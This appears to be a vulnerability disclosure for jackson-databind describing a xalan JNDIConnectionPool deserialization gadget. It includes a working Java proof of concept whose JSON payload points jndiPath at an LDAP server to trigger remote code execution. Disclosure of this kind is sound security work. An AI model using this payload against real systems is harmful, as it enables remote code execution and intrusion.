Report by: XuYuanzhen (Security Team of Alibaba Cloud)
Received: 2020-04-27
---------------------------------------------------------------------------
I find a new gadget of jackson-databind which will lead to a RCE vulnerability.

The gadget class named com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool which belongs to xalan.jar 

The dependencies in pom.xml as follow

```
<dependency>
    <groupId>org.apache.xalan</groupId>
    <artifactId>xalan</artifactId>
    <version>2.7.1</version>
</dependency>
```

The PoC as follow

```
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;


public class JacksonTest2 {


    public static void main(String[] args) throws Exception {
        String jsonTest = "[\"com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/kzgiw5\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        System.out.println("Serializing");
        Object obj = mapper.readValue(jsonTest, Object.class);
        System.out.println("objectified");
        mapper.writeValueAsString(obj);
    }
}
```
